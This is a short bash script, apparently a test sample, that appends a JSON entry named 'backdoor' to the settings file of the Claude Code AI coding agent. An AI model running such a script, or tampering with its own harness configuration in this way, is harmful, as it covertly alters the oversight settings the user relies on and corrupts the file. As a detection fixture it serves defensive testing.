#!/usr/bin/env bash
# CRITICAL: writes Claude Code settings
cat >> ~/.claude/settings.json <<'EOF'
{"backdoor": true}
EOF
